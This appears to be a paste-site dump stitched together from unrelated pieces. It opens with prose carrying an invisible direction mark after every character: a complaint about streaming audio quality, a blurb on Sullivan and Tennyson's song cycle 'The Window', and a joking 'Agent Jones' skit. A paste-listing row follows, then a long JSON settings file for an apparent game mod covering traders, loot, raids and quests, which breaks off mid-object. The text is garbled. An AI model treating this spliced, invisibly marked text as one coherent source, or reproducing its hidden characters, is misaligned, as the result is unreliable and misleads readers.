‎t‎o‎a‎s‎t‎e‎r‎ ‎f‎u‎l‎l‎ ‎o‎f‎ ‎c‎o‎m‎p‎r‎e‎s‎s‎i‎o‎n‎ ‎a‎n‎d‎ ‎d‎i‎s‎t‎o‎r‎t‎i‎o‎n‎.‎ ‎R‎a‎r‎e‎l‎y‎ ‎w‎i‎l‎l‎ ‎y‎o‎u‎ ‎f‎i‎n‎d‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎o‎f‎ ‎w‎o‎r‎t‎h‎.‎

I‎n‎ ‎g‎e‎n‎e‎r‎a‎l‎,‎ ‎i‎t‎'‎s‎ ‎m‎u‎c‎h‎ ‎m‎o‎r‎e‎ ‎w‎o‎r‎t‎h‎w‎h‎i‎l‎e‎ ‎t‎o‎ ‎d‎o‎w‎n‎l‎o‎a‎d‎ ‎y‎o‎u‎r‎ ‎m‎u‎s‎i‎c‎ ‎a‎n‎d‎ ‎l‎i‎s‎t‎e‎n‎ ‎t‎o‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎a‎n‎ ‎a‎u‎d‎i‎o‎ ‎p‎l‎a‎y‎e‎r‎,‎ ‎r‎a‎t‎h‎e‎r‎ ‎t‎h‎a‎n‎ ‎u‎s‎e‎ ‎s‎o‎f‎t‎w‎a‎r‎e‎ ‎t‎h‎a‎t‎ ‎d‎r‎a‎i‎n‎s‎ ‎a‎s‎ ‎m‎u‎c‎h‎ ‎b‎a‎t‎t‎e‎r‎y‎ ‎a‎n‎d‎ ‎m‎o‎n‎e‎y‎ ‎a‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎,‎ ‎i‎n‎s‎t‎e‎a‎d‎ ‎o‎f‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎p‎l‎a‎y‎i‎n‎g‎ ‎m‎u‎s‎i‎c‎ ‎f‎i‎l‎e‎s‎ ‎f‎o‎r‎ ‎y‎o‎u‎.‎ ‎A‎l‎t‎e‎r‎n‎a‎t‎i‎v‎e‎l‎y‎,‎ ‎y‎o‎u‎ ‎c‎o‎u‎l‎d‎ ‎u‎s‎e‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎M‎u‎s‎i‎c‎ ‎o‎n‎ ‎a‎ ‎w‎e‎b‎ ‎b‎r‎o‎w‎s‎e‎r‎ ‎a‎n‎d‎ ‎j‎u‎s‎t‎ ‎s‎w‎i‎t‎c‎h‎ ‎y‎o‎u‎r‎ ‎a‎d‎b‎l‎o‎c‎k‎e‎r‎ ‎o‎n‎.‎.‎.‎ ‎b‎u‎t‎ ‎t‎h‎e‎n‎ ‎a‎g‎a‎i‎n‎,‎ ‎Y‎o‎u‎T‎u‎b‎e‎ ‎M‎u‎s‎i‎c‎ ‎h‎a‎s‎ ‎h‎o‎r‎r‎i‎b‎l‎e‎ ‎a‎u‎d‎i‎o‎ ‎q‎u‎a‎l‎i‎t‎y‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎

(‎(‎ ‎""‎W‎A‎N‎T‎ ‎A‎ ‎B‎R‎E‎A‎K‎ ‎F‎R‎O‎M‎ ‎T‎H‎E‎ ‎M‎U‎S‎I‎C‎?‎ ‎H‎E‎R‎E‎'‎S‎ ‎A‎N‎ ‎A‎D‎ ‎T‎H‎E‎N‎""‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎W‎i‎n‎d‎o‎w‎ ‎i‎s‎ ‎a‎ ‎s‎o‎n‎g‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎m‎p‎o‎s‎e‎d‎ ‎b‎y‎ ‎A‎r‎t‎h‎u‎r‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎ ‎w‎i‎t‎h‎ ‎w‎o‎r‎d‎s‎ ‎b‎y‎ ‎A‎l‎f‎r‎e‎d‎,‎ ‎L‎o‎r‎d‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎.‎ ‎W‎r‎i‎t‎t‎e‎n‎ ‎i‎n‎ ‎1‎8‎6‎7‎ ‎a‎n‎d‎ ‎p‎u‎b‎l‎i‎s‎h‎e‎d‎ ‎i‎n‎ ‎1‎8‎7‎1‎,‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎o‎e‎m‎s‎ ‎b‎y‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎,‎ ‎e‎l‎e‎v‎e‎n‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎w‎e‎r‎e‎ ‎s‎e‎t‎ ‎t‎o‎ ‎m‎u‎s‎i‎c‎ ‎b‎y‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎i‎l‎l‎u‎s‎t‎r‎a‎t‎i‎o‎n‎,‎ ‎t‎i‎t‎l‎e‎d‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎d‎r‎a‎w‎n‎ ‎i‎n‎ ‎1‎8‎6‎8‎ ‎b‎y‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎a‎n‎d‎ ‎d‎e‎p‎i‎c‎t‎i‎n‎g‎ ‎a‎ ‎f‎e‎m‎a‎l‎e‎ ‎f‎i‎g‎u‎r‎e‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎p‎e‎n‎s‎i‎v‎e‎l‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎a‎ ‎w‎i‎n‎d‎o‎w‎.‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎a‎ ‎d‎r‎a‎f‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎e‎x‎t‎ ‎b‎y‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎8‎6‎7‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎w‎a‎s‎ ‎d‎i‎s‎s‎a‎t‎i‎s‎f‎i‎e‎d‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎w‎o‎r‎k‎ ‎a‎n‎d‎ ‎r‎e‎l‎u‎c‎t‎a‎n‎t‎ ‎t‎o‎ ‎p‎u‎b‎l‎i‎s‎h‎ ‎i‎t‎.‎ ‎I‎n‎ ‎A‎u‎g‎u‎s‎t‎ ‎1‎8‎6‎7‎,‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎r‎e‎v‎i‎s‎e‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎d‎s‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎a‎l‎l‎o‎w‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎u‎n‎t‎i‎l‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎1‎8‎7‎0‎.‎ ‎B‎y‎ ‎t‎h‎i‎s‎ ‎t‎i‎m‎e‎,‎ ‎h‎o‎w‎e‎v‎e‎r‎,‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎h‎a‎d‎ ‎d‎i‎s‎p‎o‎s‎e‎d‎ ‎o‎f‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎d‎r‎a‎w‎i‎n‎g‎s‎ ‎h‎e‎ ‎h‎a‎d‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎e‎x‎c‎e‎p‎t‎ ‎f‎o‎r‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎a‎n‎d‎ ‎h‎e‎ ‎w‎a‎s‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎t‎o‎ ‎w‎o‎r‎k‎ ‎a‎n‎y‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎

D‎r‎a‎w‎i‎n‎g‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎l‎l‎o‎.‎ ‎🤵🏻‍♂️ ‎I‎ ‎a‎m‎ ‎A‎g‎e‎n‎t‎ ‎J‎o‎n‎e‎s‎.‎ ‎W‎e‎l‎l‎,‎ ‎J‎u‎l‎i‎o‎ ‎t‎h‎e‎ ‎s‎p‎i‎c‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎a‎r‎r‎e‎s‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎ ‎p‎a‎t‎r‎o‎l‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎n‎o‎w‎ ‎i‎n‎ ‎h‎a‎n‎d‎c‎u‎f‎f‎s‎.‎ ‎I‎t‎'‎s‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎m‎e‎ ‎t‎o‎ ‎p‎e‎r‎f‎o‎r‎m‎ ‎t‎h‎e‎ ‎e‎x‎e‎c‎u‎t‎i‎o‎n‎.‎ ‎N‎E‎X‎T‎ ‎T‎I‎M‎E‎:‎ ‎J‎U‎L‎I‎O‎ ‎T‎H‎E‎ ‎S‎P‎I‎C‎ ‎V‎S‎ ‎A‎G‎E‎N‎T‎ ‎J‎O‎N‎E‎S‎!‎ ‎T‎H‎E‎ ‎F‎I‎N‎A‎L‎ ‎B‎A‎T‎T‎L‎E‎!‎ ‎🧔🏾‍♂️🔫👨🏻"
k4XJuLLH,Untitled,JNoon,JSON,Saturday 18th of October 2025 03:42:33 PM CDT,"{
  ""PresetNotes"": """",
  ""Items"": {
    ""ExamineKeys"": false,
    ""AddSignalPistolToSpec"": false,
    ""WeaponHeatOff"": false,
    ""SMGToHolster"": false,
    ""PistolToMain"": false,
    ""AllExaminedItems"": false,
    ""EquipRigsWithArmors"": false,
    ""RemoveSecureContainerFilters"": false,
    ""MisfireChance"": 1,
    ""FragmentMult"": 1,
    ""HeatFactor"": 1,
    ""ExamineTime"": 1,
    ""MalfunctChanceMult"": 1,
    ""WeightChanger"": 1,
    ""ItemPriceMult"": 1,
    ""EnableCurrency"": false,
    ""RubStack"": 500000,
    ""DollarStack"": 50000,
    ""GPStack"": 20,
    ""EuroStack"": 50000,
    ""AmmoLoadSpeed"": 1,
    ""LootExp"": 1,
    ""EnableItems"": false,
    ""ExamineExp"": 1,
    ""AmmoStacks"": {
      ""MarksmanRound"": 40,
      ""RifleRound"": 60,
      ""ShotgunRound"": 20,
      ""PistolRound"": 50
    },
    ""AmmoSwitch"": false,
    ""EnableKeys"": false,
    ""RemoveRaidRestr"": false,
    ""RemoveBackpacksRestrictions"": false,
    ""AvoidSingleKeys"": false,
    ""AvoidMarkedKeys"": false,
    ""AvoidResidential"": false,
    ""AvoidOddKeys"": false,
    ""KeyUseMult"": 1,
    ""KeycardUseMult"": 1,
    ""KeyDurabilityThreshold"": 40,
    ""IDChanger"": false,
    ""NoGearPenalty"": false,
    ""IDDefault"": """",
    ""IDParent"": """",
    ""IDFilter"": """",
    ""IDPrice"": """",
    ""InfiniteKeys"": false,
    ""InfiniteKeycards"": false,
    ""RaidDrop"": false
  },
  ""Hideout"": {
    ""EnableStash"": false,
    ""Stash"": {
      ""StashTUE"": 72,
      ""StashLvl4"": 68,
      ""StashLvl3"": 50,
      ""StashLvl2"": 40,
      ""StashLvl1"": 30
    },
    ""Regeneration"": {
      ""OfflineRegen"": false,
      ""HealthRegen"": 1,
      ""HideoutHealth"": false,
      ""HideoutEnergy"": false,
      ""HideoutHydration"": false,
      ""HydrationRegen"": 1,
      ""EnergyRegen"": 1
    },
    ""WaterFilterTime"": 325,
    ""BitcoinTime"": 720,
    ""MaxBitcoins"": 25,
    ""NoFuelMult"": 1,
    ""ScavCasePrice"": 1,
    ""ScavCaseTime"": 1,
    ""HideoutConstMult"": 1,
    ""HideoutProdMult"": 1,
    ""WaterFilterRate"": 66,
    ""GPUBoostRate"": 2.6,
    ""AirFilterRate"": 1,
    ""CultistTime"": 1,
    ""CultistMaxRewards"": 5,
    ""RemoveConstructionsRequirements"": false,
    ""RemoveConstructionsFIRRequirements"": true,
    ""RemoveSkillRequirements"": false,
    ""RemoveTraderLevelRequirements"": true,
    ""EnableHideout"": true,
    ""FuelConsumptionRate"": 0.75
  },
  ""Traders"": {
    ""Fence"": {
      ""EnableFence"": true,
      ""ArmorDurability_Max"": 60,
      ""GunDurability_Max"": 60,
      ""ArmorDurability_Min"": 35,
      ""GunDurability_Min"": 35,
      ""PriceMult"": 1.2,
      ""PremiumAmountOnSale"": 50,
      ""PresetCount"": 22,
      ""StockTime_Min"": 50,
      ""StockTime_Max"": 150,
      ""AmountOnSale"": 250,
      ""PresetMult"": 2,
      ""Blacklist"": """"
    },
    ""RemoveTradeLimits"": false,
    ""QuestRedeemDefault"": 48,
    ""QuestRedeemUnheard"": 72,
    ""TraderMarkup"": {
      ""Ragman"": 62,
      ""Peacekeeper"": 45,
      ""Fence"": 40,
      ""Prapor"": 50,
      ""Jaeger"": 60,
      ""Ref"": 56,
      ""Mechanic"": 56,
      ""Skier"": 49,
      ""Therapist"": 63
    },
    ""TraderSell"": {
      ""Ragman"": 1,
      ""Peacekeeper"": 1,
      ""Prapor"": 1,
      ""Jaeger"": 1,
      ""Mechanic"": 1,
      ""Skier"": 1,
      ""Ref"": 1,
      ""Therapist"": 1
    },
    ""MinDurabSell"": 60,
    ""RemoveTimeCondition"": false,
    ""AllQuestsAvailable"": false,
    ""RemoveBarterOffers"": false,
    ""RemoveCurrencyOffers"": false,
    ""IncreaseAssort"": false,
    ""UnlockQuestAssort"": false,
    ""EnableTraders"": true,
    ""FIRRestrictsQuests"": false,
    ""TradersLvl4"": false,
    ""FIRTrade"": false,
    ""UnlockJaeger"": false,
    ""UnlockRef"": false
  },
  ""Loot"": {
    ""Airdrops"": {
      ""Mixed"": {
        ""ArmorMin"": 1,
        ""ArmorMax"": 5,
        ""BarterMin"": 15,
        ""BarterMax"": 35,
        ""PresetMin"": 3,
        ""PresetMax"": 5,
        ""CratesMin"": 1,
        ""CratesMax"": 2
      },
      ""Medical"": {
        ""ArmorMin"": 0,
        ""ArmorMax"": 0,
        ""BarterMin"": 25,
        ""BarterMax"": 45,
        ""PresetMin"": 0,
        ""PresetMax"": 0,
        ""CratesMin"": 0,
        ""CratesMax"": 0
      },
      ""Barter"": {
        ""ArmorMin"": 0,
        ""ArmorMax"": 0,
        ""BarterMin"": 20,
        ""BarterMax"": 35,
        ""PresetMin"": 0,
        ""PresetMax"": 0,
        ""CratesMin"": 0,
        ""CratesMax"": 0
      },
      ""Weapon"": {
        ""ArmorMin"": 3,
        ""ArmorMax"": 6,
        ""BarterMin"": 11,
        ""BarterMax"": 22,
        ""PresetMin"": 6,
        ""PresetMax"": 8,
        ""CratesMin"": 0,
        ""CratesMax"": 2
      },
      ""Sandbox_air"": 13,
      ""Streets_air"": 13,
      ""AirtimeMin"": 1,
      ""AirtimeMax"": 5,
      ""Lighthouse_air"": 20,
      ""Bigmap_air"": 20,
      ""Interchange_air"": 20,
      ""Shoreline_air"": 20,
      ""Reserve_air"": 10,
      ""Woods_air"": 25
    },
    ""EnableLoot"": false,
    ""Locations"": {
      ""Streets"": {
        ""Loose"": 3,
        ""Container"": 1
      },
      ""Sandbox"": {
        ""Loose"": 2.8,
        ""Container"": 1
      },
      ""SandboxHard"": {
        ""Loose"": 2.8,
        ""Container"": 1
      },
      ""Lighthouse"": {
        ""Loose"": 2.8,
        ""Container"": 1
      },
      ""Bigmap"": {
        ""Loose"": 2.5,
        ""Container"": 1
      },
      ""Interchange"": {
        ""Loose"": 2.8,
        ""Container"": 1
      },
      ""FactoryDay"": {
        ""Loose"": 3.5,
        ""Container"": 1
      },
      ""Laboratory"": {
        ""Loose"": 2.8,
        ""Container"": 1
      },
      ""Shoreline"": {
        ""Loose"": 3.7,
        ""Container"": 1
      },
      ""Reserve"": {
        ""Loose"": 2.9,
        ""Container"": 1
      },
      ""Woods"": {
        ""Loose"": 1.9,
        ""Container"": 1
      },
      ""FactoryNight"": {
        ""Loose"": 3.5,
        ""Container"": 1
      },
      ""AllContainers"": false
    }
  },
  ""Player"": {
    ""EnableFatigue"": false,
    ""PMCStats"": {
      ""MaxHydration"": 100,
      ""MaxEnergy"": 100
    },
    ""CharXP"": {
      ""ScavKill"": 80,
      ""ScavHMult"": 1.1,
      ""PMCKill"": 175,
      ""PMCHMult"": 1.2
    },
    ""RaidMult"": {
      ""MIA"": 1,
      ""Runner"": 0.5,
      ""Survived"": 2.5,
      ""Killed"": 1
    },
    ""EnableStats"": false,
    ""Skills"": {
      ""SkillFatigueReset"": 200,
      ""SkillFreshEffect"": 1.3,
      ""SkillFPoints"": 1,
      ""SkillPointsBeforeFatigue"": 1,
      ""SkillMinEffect"": 0.0001,
      ""SkillFatiguePerPoint"": 0.6
    },
    ""FallDamage"": true,
    ""BlackStomach"": 5,
    ""HydrationLoss"": 1,
    ""EnergyLoss"": 1,
    ""EnableHealth"": false,
    ""SkillProgMult"": 0.4,
    ""Health"": {
      ""LeftArm"": 60,
      ""RightArm"": 60,
      ""Head"": 35,
      ""Chest"": 85,
      ""Stomach"": 70,
      ""LeftLeg"": 65,
      ""RightLeg"": 65
    },
    ""WeaponSkillMult"": 1,
    ""EnablePlayer"": true,
    ""DiedHealth"": {
      ""Saveeffects"": true,
      ""Savehealth"": true,
      ""Health_blacked"": 0.1,
      ""Health_death"": 0.3
    },
    ""MaxStaminaLegs"": 115,
    ""MaxStaminaHands"": 80,
    ""EnableStaminaHands"": false,
    ""EnableStaminaLegs"": false,
    ""RegenStaminaLegs"": 4.5,
    ""RegenStaminaHands"": 2.1,
    ""JumpConsumption"": 14,
    ""LayToStand"": 20,
    ""CrouchToStand"": 11,
    ""Standing"": 1,
    ""LayingDown"": 0.15,
    ""Crouching"": 0.75,
    ""UnlimitedStamina"": false
  },
  ""Raids"": {
    ""SandboxAccessLevel"": 20,
    ""RaidTime"": 0,
    ""SaveQuestItems"": false,
    ""Exfils"": {
      ""CarSandbox"": 5000,
      ""CarShoreline"": 5000,
      ""CoopPaidSandbox"": 5000,
      ""CoopPaidShoreline"": 5000,
      ""CoopPaidStreets"": 5000,
      ""CoopPaidLighthouse"": 5000,
      ""CarLighthouse"": 5000,
      ""CarExtractTime"": 60,
      ""ArmorExtract"": true,
      ""CoopPaid"": true,
      ""FenceGift"": false,
      ""CoopPaidInterchange"": 5000,
      ""CoopPaidWoods"": 5000,
      ""CoopPaidReserve"": 5000,
      ""NoBackpack"": true,
      ""FreeCoop"": true,
      ""CarInterchange"": 5000,
      ""CarWoods"": 5000,
      ""CarStreets"": 5000,
      ""CarCustoms"": 5000,
      ""ExtendedExtracts"": false,
      ""ChanceExtracts"": false,
      ""GearExtract"": false
    },
    ""NoRunThrough"": true,
    ""Timeacceleration"": 7,
    ""SafeExit"": false,
    ""SaveGearAfterDeath"": false,
    ""RaidEvents"": {
      ""DisableEvents"": false,
      ""KillaFactoryChance"": 100,
      ""CultistBossesChance"": 35,
      ""GoonsFactoryChance"": 60,
      ""CultistBosses"": true,
      ""GoonsFactory"": true,
      ""BossesOnCustoms"": false,
      ""BossesOnHealthResort"": false,
      ""TagillaInterchange"": false,
      ""HealthResortIncludeGuards"": false,
      ""HoundsWoods"": 5,
      ""HoundsCustoms"": 5,
      ""SkierFighters"": 4,
      ""PeaceFighters"": 15,
      ""Christmas"": false,
      ""NonSeasonalQuests"": false,
      ""Halloween"": false,
      ""DisableZombies"": false,
      ""DisableHalloweenAIFriendly"": false,
      ""RandomInfectionLevel"": false,
      ""IncludeStreetBosses"": false,
      ""KillaFactory"": false,
      ""BossesOnReserve"": false,
      ""RaidersEverywhere"": false,
      ""GlukharLabs"": false
    },
    ""LabInsurance"": true,
    ""EnableRaids"": true,
    ""Removelabkey"": false,
    ""EnableCarCoop"": true,
    ""ForceBTRFriendly"": false,
    ""ForceTransitStash"": false,
    ""TransitHeight"": 2,
    ""TransitWidth"": 5,
    ""ForceBTRStash"": false,
    ""EnableBTR"": false,
    ""BTRCoverPrice"": 30000,
    ""BTRTaxiPrice"": 7000,
    ""UsecMult"": 1.5,
    ""BearMult"": 1,
    ""ScavMult"": 0.8,
    ""BTRHeight"": 2,
    ""BTRWidth"": 5,
    ""Season"": 0,
    ""ForceSeason"": false,
    ""RaidStartup"": {
      ""EnableRaidStartup"": true,
      ""TimeBeforeDeployLocal"": 5,
      ""AIAmount"": 3,
      ""SaveLoot"": true,
      ""AIDifficulty"": 1,
      ""MIAEndofRaid"": true,
      ""TaggedAndCursed"": false,
      ""EnableBosses"": false,
      ""ScavWars"": true
    }
  },
  ""Fleamarket"": {
    ""EnableFleaConditions"": false,
    ""EnablePlayerOffers"": false,
    ""FleaFIR"": false,
    ""FleaNoFIRSell"": false,
    ""EventOffers"": false,
    ""SellOffersAmount"": 10,
    ""FleaConditions"": {
      ""FleaFood_Min"": 5,
      ""FleaArmor_Min"": 5,
      ""FleaFood_Max"": 100,
      ""FleaArmor_Max"": 100,
      ""FleaMedical_Min"": 60,
      ""FleaSpec_Min"": 2,
      ""FleaMedical_Max"": 100,
      ""FleaSpec_Max"": 100,
      ""FleaWeapons_Min"": 60,
      ""FleaVests_Min"": 5,
      ""FleaKeys_Min"": 97,
      ""FleaWeapons_Max"": 100,
      ""FleaVests_Max"": 100,
      ""FleaKeys_Max"": 100
    },
    ""OverrideOffers"": false,
    ""FleaMarketLevel"": 15,
    ""FleaBlacklist"": null,
    ""DisableBSGList"": false,
    ""EnableFleamarket"": false,
    ""Sell_mult"": 1.24,
    ""Tradeoffer_max"": 1,
    ""Rep_loss"": 0.03,
    ""Rep_gain"": 0.02,
    ""Tradeoffer_min"": 0,
    ""Sell_chance"": 50,
    ""EnableFees"": true,
    ""DynamicOffers"": {
      ""ExpireThreshold"": 1400,
      ""BundleOfferChance"": 6,
      ""Stack_min"": 10,
      ""PerOffer_min"": 7,
      ""Stack_max"": 600,
      ""PerOffer_max"": 30,
      ""Eurooffers"": 8,
      ""Dollaroffers"": 14,
      ""Roubleoffers"": 78,
      ""NonStack_min"": 1,
      ""Time_min"": 6,
      ""Price_min"": 0.8,
      ""NonStack_max"": 10,
      ""Time_max"": 60,
      ""Price_max"": 1.2
    }
  },
  ""Services"": {
    ""RepairBox"": {
      ""NoRandomRepair"": false,
      ""OpGunRepair"": false,
      ""ArmorSkillMult"": 0.05,
      ""WeaponMaintenanceSkillMult"": 0.6,
      ""IntellectSkillMultWeaponKit"": 0.045,
      ""IntellectSkillMultArmorKit"": 0.03,
      ""IntellectSkillLimitTraders"": 0.6,
      ""IntellectSkillLimitKit"": 0.6,
      ""OpArmorRepair"": false,
      ""RepairMult"": 1
    },
    ""EnableHealMarkup"": true,
    ""EnableInsurance"": false,
    ""EnableTimeOverride"": false,
    ""FreeHealLvl"": 50,
    ""FreeHealRaids"": 30,
    ""ReturnChancePrapor"": 85,
    ""ReturnChanceTherapist"": 95,
    ""InsuranceInterval"": 600,
    ""InsuranceTimeOverride"": 30,
    ""InsuranceAttachmentChance"": 10,
    ""TherapistStorageTime"": 144,
    ""PraporStorageTime"": 96,
    ""Prapor_Max"": 36,
    ""Prapor_Min"": 24,
    ""Therapist_Max"": 24,
    ""Therapist_Min"": 12,
    ""TherapistLvl1"": 1,
    ""TherapistLvl2"": 1.1,
    ""TherapistLvl3"": 1.2,
    ""TherapistLvl4"": 1.35,
    ""InsuranceMultTherapistLvl1"": 20,
    ""InsuranceMultTherapistLvl2"": 21,
    ""InsuranceMultTherapistLvl3"": 22,
    ""InsuranceMultTherapistLvl4"": 23,
    ""InsuranceMultPraporLvl1"": 16,
    ""InsuranceMultPraporLvl2"": 17,
    ""InsuranceMultPraporLvl3"": 18,
    ""InsuranceMultPraporLvl4"": 19,
    ""EnableServices"": true,
    ""EnableRepair"": false,
    ""ClothesAnySide"": true,
    ""ClothesLevelUnlock"": true,
    ""ClothesFree"": false
  },
  ""Quests"": {
    ""EnableQuestsMisc"": false,
    ""QuestCostMult"": 1,
    ""QuestRepToZero"": false,
    ""DailyQuests"": {
      ""MinKillsLR3"": 5,
      ""MaxKillsLR3"": 20,
      ""MinKillsLR2"": 5,
      ""MaxKillsLR2"": 15,
      ""MinItems"": 2,
      ""MaxItems"": 5,
      ""Extracts"": 3,
      ""Types"": 6,
      ""Reroll"": 2,
      ""Spread"": 0.5,
      ""MinKillsLR1"": 2,
      ""MaxKillsLR1"": 4,
      ""Access"": 5,
      ""QuestAmount"": 3,
      ""Lifespan"": 1440,
      ""Levels"": ""1,10,20,30,40,50,60"",
      ""Experience"": ""1000,2000,8000,13000,19000,24000,30000"",
      ""ItemsReward"": ""2,4,5,5,5,5,5"",
      ""Reputation"": ""0.01,0.01,0.02,0.02,0.03,0.03,0.03"",
      ""SkillPoint"": ""10,15,20,25,30,35,40"",
      ""SkillChance"": ""0,0.01,0.05,0.1,0.1,0.15,0.15"",
      ""Roubles"": ""11000,20000,32000,45000,58000,70000,82000"",
      ""GPcoins"": ""3,3,6,6,8,8,10""
    },
    ""WeeklyQuests"": {
      ""MinKillsLR3"": 20,
      ""MaxKillsLR3"": 40,
      ""MinKillsLR2"": 15,
      ""MaxKillsLR2"": 40,
      ""MinItems"": 2,
      ""MaxItems"": 5,
      ""Extracts"": 10,
      ""Types"": 6,
      ""Reroll"": 0,
      ""Spread"": 0.5,
      ""MinKillsLR1"": 10,
      ""MaxKillsLR1"": 20,
      ""Access"": 15,
      ""QuestAmount"": 1,
      ""Lifespan"": 10080,
      ""Levels"": ""1,10,20,30,40,50,60"",
      ""Experience"": ""5000,15000,27000,80000,142000,220000,290000"",
      ""ItemsReward"": ""4,5,5,6,6,7,7"",
      ""Reputation"": ""0.02,0.03,0.04,0.04,0.05,0.05,0.05"",
      ""SkillPoint"": ""25,35,45,50,55,60,65"",
      ""SkillChance"": ""0,0.05,0.1,0.15,0.2,0.2,0.2"",
      ""Roubles"": ""20000,50000,175000,350000,540000,710000,880000"",
      ""GPcoins"": ""10,10,16,16,20,30,35""
    },
    ""EnableQuests"": false,
    ""ScavQuests"": {
      ""MinKillsLR2"": 3,
      ""MaxKillsLR2"": 15,
      ""MinItems"": 2,
      ""MaxItems"": 5,
      ""Extracts"": 3,
      ""Types"": 2,
      ""Reroll"": 0,
      ""Spread"": 0.5,
      ""MinKillsLR1"": 1,
      ""MaxKillsLR1"": 3,
      ""Access"": 1,
      ""QuestAmount"": 1,
      ""Lifespan"": 1440,
      ""Levels"": ""1,10,20,30,40,50,60"",
      ""Experience"": ""0,0,0,0,0,0,0"",
      ""ItemsReward"": ""2,3,3,3,3,4,4"",
      ""Reputation"": ""0.02,0.02,0.03,0.03,0.04,0.04,0.05"",
      ""SkillPoint"": ""10,15,20,25,30,35,40"",
      ""SkillChance"": ""0,0,0,0,0,0,0"",
      ""Roubles"": ""11000,20000,32000,45000,58000,70000,82000"",
      ""GPcoins"": ""1,1,2,2,4,4,5""
    }
  },
  ""CSM"": {
    ""EnableCases"": true,
    ""EnableSecureCases"": true,
    ""CustomPocket"": false,
    ""Pockets"": {
      ""SpecGKeychain"": false,
      ""SpecSimpleWallet"": false,
      ""SpecWZWallet"": false,
      ""SpecKeycardHolder"": false,
      ""SpecKeytool"": false,
      ""SpecInjectorCase"": false,
      ""SpecSlots"": 3,
      ""FourthWidth"": 1,
      ""FourthHeight"": 1,
      ""ThirdWidth"": 1,
      ""ThirdHeight"": 1,
      ""SecondWidth"": 1,
      ""SecondHeight"": 1,
      ""FirstWidth"": 1,
      ""FirstHeight"": 1
    },
    ""Cases"": {
      ""GKeychain"": {
        ""Height"": 2,
        ""Width"": 2,
        ""Filter"": false
      },
      ""KeycardHolderCase"": {
        ""Height"": 5,
        ""Width"": 5,
        ""Filter"": false
      },
      ""InjectorCase"": {
        ""Height"": 3,
        ""Width"": 3,
        ""Filter"": false
      },
      ""Holodilnick"": {
        ""Height"": 8,
        ""Width"": 8,
        ""Filter"": false
      },
      ""PistolCase"": {
        ""Height"": 3,
        ""Width"": 4,
        ""Filter"": false
      },
      ""DocumentsCase"": {
        ""Height"": 6,
        ""Width"": 6,
        ""Filter"": false
      },
      ""Keytool"": {
        ""Height"": 6,
        ""Width"": 6,
        ""Filter"": false
      },
      ""SiccCase"": {
        ""Height"": 5,
        ""Width"": 5,
        ""Filter"": false
      },
      ""ThiccWeaponCase"": {
        ""Height"": 15,
        ""Width"": 6,
        ""Filter"": false
      },
      ""ThiccItemsCase"": {
        ""Height"": 14,
        ""Width"": 14,
        ""Filter"": false
      },
      ""MedicineCase"": {
        ""Height"": 7,
        ""Width"": 7,
